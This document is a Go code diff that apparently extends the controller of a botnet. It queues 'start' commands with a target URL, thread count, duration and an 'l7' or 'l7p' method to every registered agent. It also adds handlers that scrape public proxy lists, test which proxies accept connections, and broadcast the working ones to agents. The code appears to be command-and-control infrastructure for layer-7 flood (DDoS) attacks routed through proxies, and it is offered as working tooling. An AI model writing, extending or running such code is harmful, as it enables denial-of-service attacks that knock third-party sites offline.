@@ -7,7 +7,9 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"log/slog"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -22,11 +24,13 @@ import (
 // ─── Models & Store ───────────────────────────────────────────────────────────
 
 type Command struct {
-	Action     string `json:"action"`
-	URL        string `json:"url"`
-	Threads    int    `json:"threads"`
-	Timer      int    `json:"timer"`
-	CustomHost string `json:"custom_host"`
+	Action     string   `json:"action"`
+	URL        string   `json:"url"`
+	Threads    int      `json:"threads"`
+	Timer      int      `json:"timer"`
+	CustomHost string   `json:"custom_host"`
+	Method     string   `json:"method"`
+	Proxies    []string `json:"proxies,omitempty"`
 }
 
 type AgentStatus struct {
@@ -320,62 +324,102 @@ func (s *Store) handleCommand(events chan<- eventPayload) http.HandlerFunc {
 			return
 		}
 
-		threads, err1 := strconv.Atoi(r.FormValue("threads"))
-		timer, err2 := strconv.Atoi(r.FormValue("timer"))
-		if err1 != nil || err2 != nil {
-			http.Error(w, "invalid numeric parameter", http.StatusBadRequest)
-			return
-		}
-		if threads <= 0 || timer <= 0 {
-			http.Error(w, "threads and timer must be positive", http.StatusBadRequest)
-			return
+		action := r.FormValue("action")
+		if action == "" {
+			action = "start"
 		}
 
-		rawURL := strings.TrimSpace(r.FormValue("url"))
-		if err := validateURL(rawURL); err != nil {
-			http.Error(w, err.Error(), http.StatusBadRequest)
-			return
-		}
-
-		cmd := Command{
-			Action:     "start",
-			URL:        rawURL,
-			Threads:    threads,
-			Timer:      timer,
-			CustomHost: r.FormValue("custom_host"),
-		}
-
-		// Persist to in-memory history (newest first, capped at maxHistory).
-		s.historyMu.Lock()
-		s.history = append([]Command{cmd}, s.history...)
-		if len(s.history) > maxHistory {
-			s.history = s.history[:maxHistory]
-		}
-		s.historyMu.Unlock()
-
-		var evs []eventPayload
-		s.agentsMu.Lock()
-		for id := range s.agents {
-			s.cmdsMu.Lock()
-			if len(s.pending[id]) >= maxQueueDepth {
-				slog.Warn("queue full, dropping command", "agentID", id)
-				s.cmdsMu.Unlock()
-				continue
+		var cmd Command
+		if action == "stop" {
+			cmd = Command{Action: "stop"}
+		} else {
+			threadsStr := r.FormValue("threads")
+			if threadsStr == "" {
+				threadsStr = "64"
 			}
-			s.pending[id] = append(s.pending[id], cmd)
-			s.cmdsMu.Unlock()
-			evs = append(evs, eventPayload{AgentID: id, Name: "command-enqueued", Data: cmd})
+			threads, err1 := strconv.Atoi(threadsStr)
+
+			timerStr := r.FormValue("timer")
+			if timerStr == "" {
+				timerStr = "60"
+			}
+			timer, err2 := strconv.Atoi(timerStr)
+			if err1 != nil || err2 != nil {
+				http.Error(w, "invalid numeric parameter", http.StatusBadRequest)
+				return
+			}
+			if threads <= 0 || timer <= 0 {
+				http.Error(w, "threads and timer must be positive", http.StatusBadRequest)
+				return
+			}
+
+			rawURL := strings.TrimSpace(r.FormValue("url"))
+			if err := validateURL(rawURL); err != nil {
+				http.Error(w, err.Error(), http.StatusBadRequest)
+				return
+			}
+
+			method := r.FormValue("method")
+			if method != "l7p" {
+				method = "l7"
+			}
+
+			cmd = Command{
+				Action:     "start",
+				URL:        rawURL,
+				Threads:    threads,
+				Timer:      timer,
+				CustomHost: r.FormValue("custom_host"),
+				Method:     method,
+			}
+		}
+
+		// Only persist actionable commands to history (skip stop).
+		if cmd.Action != "stop" {
+			s.historyMu.Lock()
+			s.history = append([]Command{cmd}, s.history...)
+			if len(s.history) > maxHistory {
+				s.history = s.history[:maxHistory]
+			}
+			s.historyMu.Unlock()
+		}
+
+		// Snapshot agent IDs under agentsMu, then enqueue under cmdsMu separately
+		// to avoid nested locking (agentsMu → cmdsMu) which risks deadlock.
+		s.agentsMu.Lock()
+		agentIDs := make([]string, 0, len(s.agents))
+		for id := range s.agents {
+			agentIDs = append(agentIDs, id)
 		}
 		s.agentsMu.Unlock()
 
+		var evs []eventPayload
+		s.cmdsMu.Lock()
+		for _, id := range agentIDs {
+			if len(s.pending[id]) >= maxQueueDepth {
+				slog.Warn("queue full, dropping command", "agentID", id)
+				continue
+			}
+			s.pending[id] = append(s.pending[id], cmd)
+			evs = append(evs, eventPayload{AgentID: id, Name: "command-enqueued", Data: cmd})
+		}
+		s.cmdsMu.Unlock()
+
 		go func() {
 			for _, ev := range evs {
-				events <- ev
+				select {
+				case events <- ev:
+				default:
+					slog.Warn("event channel full, dropping", "agentID", ev.AgentID)
+				}
 				slog.Info("enqueued command", "agentID", ev.AgentID, "url", cmd.URL, "threads", cmd.Threads)
 			}
 			// One dedicated event for the dashboard (wildcard agentID "").
 			if len(evs) > 0 {
-				events <- eventPayload{AgentID: "", Name: "command-enqueued", Data: cmd}
+				select {
+				case events <- eventPayload{AgentID: "", Name: "command-enqueued", Data: cmd}:
+				default:
+				}
 			}
 		}()
 
@@ -454,7 +498,8 @@ func (s *Store) agentStatusHandler(events chan<- eventPayload) http.HandlerFunc 
 			AgentID string `json:"agentID"`
 			Status  string `json:"status"`
 		}
-		if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
+		// Limit body to 1 MB to prevent abuse.
+		if err := json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(&p); err != nil {
 			http.Error(w, "invalid JSON", http.StatusBadRequest)
 			return
 		}
@@ -481,7 +526,12 @@ func (s *Store) agentStatusHandler(events chan<- eventPayload) http.HandlerFunc 
 		snapshot := *st
 		s.statusMu.Unlock()
 
-		events <- eventPayload{AgentID: p.AgentID, Name: "agent-status-changed", Data: snapshot}
+		// Non-blocking send to avoid stalling the HTTP handler if the channel is full.
+		select {
+		case events <- eventPayload{AgentID: p.AgentID, Name: "agent-status-changed", Data: snapshot}:
+		default:
+			slog.Warn("event channel full, dropping status event", "agentID", p.AgentID)
+		}
 		w.WriteHeader(http.StatusOK)
 	}
 }
@@ -526,6 +576,250 @@ func renderInterface(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, "Interface/index.html")
 }
 
+// ─── Proxy Scraper ────────────────────────────────────────────────────────────
+
+// proxySourcesByProtocol maps protocol name → list of raw-text proxy sources.
+var proxySourcesByProtocol = map[string][]string{
+	"http": {
+		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+	},
+	"https": {
+		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
+		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/https.txt",
+		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
+	},
+	"socks4": {
+		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
+		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
+		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
+	},
+	"socks5": {
+		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
+		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+	},
+}
+
+var proxyFetchClient = &http.Client{Timeout: 20 * time.Second}
+
+func scrapeProxiesHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		methodNotAllowed(w)
+		return
+	}
+
+	protocol := r.URL.Query().Get("protocol")
+	if protocol == "" {
+		protocol = "http"
+	}
+	sources, ok := proxySourcesByProtocol[protocol]
+	if !ok {
+		http.Error(w, "unknown protocol", http.StatusBadRequest)
+		return
+	}
+
+	type fetchResult struct {
+		proxies []string
+		source  string
+		err     error
+	}
+
+	ch := make(chan fetchResult, len(sources))
+	for _, src := range sources {
+		src := src
+		go func() {
+			resp, err := proxyFetchClient.Get(src)
+			if err != nil {
+				ch <- fetchResult{source: src, err: err}
+				return
+			}
+			defer resp.Body.Close()
+			body, err := io.ReadAll(io.LimitReader(resp.Body, 5<<20))
+			if err != nil {
+				ch <- fetchResult{source: src, err: err}
+				return
+			}
+			var proxies []string
+			for _, line := range strings.Split(string(body), "\n") {
+				line = strings.TrimSpace(line)
+				if line == "" || strings.HasPrefix(line, "#") {
+					continue
+				}
+				if strings.Contains(line, ":") {
+					proxies = append(proxies, line)
+				}
+			}
+			ch <- fetchResult{source: src, proxies: proxies}
+		}()
+	}
+
+	seen := make(map[string]struct{})
+	var all []string
+	for range sources {
+		res := <-ch
+		if res.err != nil {
+			slog.Warn("proxy source failed", "source", res.source, "err", res.err)
+			continue
+		}
+		for _, p := range res.proxies {
+			if _, ok := seen[p]; !ok {
+				seen[p] = struct{}{}
+				all = append(all, p)
+			}
+		}
+		slog.Info("proxy source scraped", "source", res.source, "count", len(res.proxies))
+	}
+
+	if all == nil {
+		all = []string{}
+	}
+	writeJSON(w, map[string]interface{}{
+		"proxies":  all,
+		"count":    len(all),
+		"protocol": protocol,
+	})
+}
+
+// testProxiesHandler tests each proxy via TCP dial and returns only
+// those that accept a connection within the specified timeout.
+// Up to 100 concurrent dials.
+func testProxiesHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		methodNotAllowed(w)
+		return
+	}
+
+	var body struct {
+		Proxies   []string `json:"proxies"`
+		TimeoutMs int      `json:"timeout_ms"`
+	}
+	// Limit body to 10 MB to prevent abuse (proxy lists can be large).
+	if err := json.NewDecoder(io.LimitReader(r.Body, 10<<20)).Decode(&body); err != nil {
+		http.Error(w, "invalid JSON", http.StatusBadRequest)
+		return
+	}
+	if len(body.Proxies) == 0 {
+		writeJSON(w, map[string]interface{}{"working": []interface{}{}, "count": 0})
+		return
+	}
+
+	timeoutMs := body.TimeoutMs
+	if timeoutMs <= 0 {
+		timeoutMs = 3000
+	}
+	timeout := time.Duration(timeoutMs) * time.Millisecond
+
+	type result struct {
+		proxy   string
+		working bool
+		latency int64
+	}
+
+	sem := make(chan struct{}, 100) // max 100 concurrent dials
+	ch := make(chan result, len(body.Proxies))
+
+	for _, proxy := range body.Proxies {
+		go func(p string) {
+			sem <- struct{}{}
+			defer func() { <-sem }()
+
+			start := time.Now()
+			conn, err := net.DialTimeout("tcp", p, timeout)
+			latency := time.Since(start).Milliseconds()
+
+			if err != nil {
+				ch <- result{proxy: p, working: false}
+				return
+			}
+			conn.Close()
+			ch <- result{proxy: p, working: true, latency: latency}
+		}(proxy)
+	}
+
+	type WorkingProxy struct {
+		Proxy   string `json:"proxy"`
+		Latency int64  `json:"latency"`
+	}
+	working := make([]WorkingProxy, 0)
+	for range body.Proxies {
+		res := <-ch
+		if res.working {
+			working = append(working, WorkingProxy{Proxy: res.proxy, Latency: res.latency})
+		}
+	}
+
+	slog.Info("proxy test complete", "total", len(body.Proxies), "working", len(working))
+	writeJSON(w, map[string]interface{}{
+		"working": working,
+		"count":   len(working),
+	})
+}
+
+func (s *Store) broadcastProxiesHandler(events chan<- eventPayload) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPost {
+			methodNotAllowed(w)
+			return
+		}
+		var body struct {
+			Proxies []string `json:"proxies"`
+		}
+		// Limit body to 10 MB.
+		if err := json.NewDecoder(io.LimitReader(r.Body, 10<<20)).Decode(&body); err != nil {
+			http.Error(w, "invalid JSON", http.StatusBadRequest)
+			return
+		}
+
+		cmd := Command{
+			Action:  "update_proxies",
+			Proxies: body.Proxies,
+		}
+
+		// Snapshot agent IDs to avoid nested locking.
+		s.agentsMu.Lock()
+		agentIDs := make([]string, 0, len(s.agents))
+		for id := range s.agents {
+			agentIDs = append(agentIDs, id)
+		}
+		s.agentsMu.Unlock()
+
+		var evs []eventPayload
+		s.cmdsMu.Lock()
+		for _, id := range agentIDs {
+			if len(s.pending[id]) < maxQueueDepth {
+				s.pending[id] = append(s.pending[id], cmd)
+				evs = append(evs, eventPayload{AgentID: id, Name: "command-enqueued", Data: cmd})
+			}
+		}
+		s.cmdsMu.Unlock()
+
+		go func() {
+			for _, ev := range evs {
+				select {
+				case events <- ev:
+				default:
+				}
+			}
+			if len(evs) > 0 {
+				select {
+				case events <- eventPayload{AgentID: "", Name: "command-enqueued", Data: cmd}:
+				default:
+				}
+			}
+		}()
+
+		slog.Info("broadcasted proxies to agents", "count", len(body.Proxies), "agents", len(evs))
+		writeJSON(w, map[string]string{"status": "ok"})
+	}
+}
+
 // ─── Main ────────────────────────────────────────────────────────────────────
 
 func main() {
@@ -564,12 +858,15 @@ func main() {
 
 	mux := http.NewServeMux()
 	mux.Handle("/Interface/", http.StripPrefix("/Interface/", http.FileServer(http.Dir("Interface"))))
-	mux.HandleFunc("/events", store.sseHandler)
+	mux.HandleFunc("/events", authMiddleware(token, store.sseHandler))
 	mux.HandleFunc("/command", authMiddleware(token, store.handleCommand(events)))
 	mux.HandleFunc("/poll-agent", authMiddleware(token, store.agentPollHandler(events)))
 	mux.HandleFunc("/agent-status", authMiddleware(token, store.agentStatusHandler(events)))
-	mux.HandleFunc("/agent-statuses", store.listAgentStatuses)
-	mux.HandleFunc("/command-history", store.listCommandHistory)
+	mux.HandleFunc("/agent-statuses", authMiddleware(token, store.listAgentStatuses))
+	mux.HandleFunc("/command-history", authMiddleware(token, store.listCommandHistory))
+	mux.HandleFunc("/scrape-proxies", authMiddleware(token, scrapeProxiesHandler))
+	mux.HandleFunc("/test-proxies", authMiddleware(token, testProxiesHandler))
+	mux.HandleFunc("/broadcast-proxies", authMiddleware(token, store.broadcastProxiesHandler(events)))
 	mux.HandleFunc("/", renderInterface)
 
 	srv := &http.Server{
